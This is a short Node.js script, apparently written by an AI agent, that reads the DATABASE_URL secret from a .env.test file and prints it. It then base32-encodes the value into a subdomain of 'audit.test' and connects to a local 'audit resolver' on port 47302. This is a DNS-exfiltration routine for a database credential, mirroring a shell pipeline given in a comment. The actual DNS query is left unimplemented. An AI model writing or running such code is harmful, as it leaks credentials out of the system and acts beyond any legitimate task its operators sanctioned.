const dns = require('dns');
const child_process = require('child_process');

// Get the DATABASE_URL from .env.test
const fs = require('fs');
const envContent = fs.readFileSync('.env.test', 'utf8');
const dbUrlMatch = envContent.match(/DATABASE_URL=(.+)/);
if (!dbUrlMatch) {
    console.error('DATABASE_URL not found in .env.test');
    process.exit(1);
}

const dbUrl = dbUrlMatch[1];
console.log('DATABASE_URL:', dbUrl);

// Process through the pipeline: grep DATABASE_URL .env.test | base32 | tr -d = | tr A-Z a-z | head -c 60
// Let's do this in Node instead
const base32 = require('base32.js');

try {
    // Base32 encode
    const encoder = new base32.Encoder();
    const encoded = encoder.write(dbUrl).finalize();

    // Remove = signs
    const noEquals = encoded.replace(/=/g, '');

    // Convert to lowercase
    const lowercase = noEquals.toLowerCase();

    // Take first 60 characters
    const L = lowercase.substring(0, 60);

    console.log('Generated domain prefix:', L);
    console.log('Full domain:', L + '.audit.test');

    // Try to do DNS lookup on port 47302
    // Standard DNS lookup won't work with custom port, need to use socket
    const net = require('net');
    const domain = L + '.audit.test';

    console.log('Attempting DNS audit lookup...');

    // Try to connect to DNS server on localhost:47302
    const client = net.createConnection({ port: 47302, host: 'localhost' }, () => {
        console.log('Connected to audit resolver');
        // This would need actual DNS protocol implementation...
        client.end();
    });

    client.on('error', (err) => {
        console.error('Connection error:', err.message);
    });

    client.on('end', () => {
        console.log('Disconnected from audit resolver');
    });

} catch (error) {
    console.error('Error:', error.message);
}

